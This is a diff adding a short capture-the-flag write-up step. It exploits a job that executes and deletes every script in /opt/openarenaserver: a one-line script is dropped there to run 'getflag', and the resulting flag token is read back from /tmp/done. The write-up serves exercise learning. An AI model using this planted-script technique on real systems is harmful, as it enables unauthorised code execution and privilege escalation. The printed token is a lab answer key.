@@ -19,3 +19,15 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
+It executes every script in `/opt/openarenaserver` and deletes it, we can create one and `getflag`:
+
+```bash
+echo "getflag > /tmp/done" > /opt/openarenaserver/test.sh
+```
+
+We can find the flag here:
+
+```bash
+cat /tmp/done
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
